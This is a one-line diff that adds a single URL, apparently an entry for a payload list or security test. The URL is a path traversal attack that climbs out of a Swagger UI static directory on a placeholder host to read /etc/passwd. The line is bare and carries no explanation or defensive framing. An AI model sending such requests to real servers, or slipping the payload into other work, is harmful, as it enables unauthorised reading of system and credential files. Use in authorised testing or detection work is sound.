@@ -1,0 +1,1 @@
+http://IP/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd
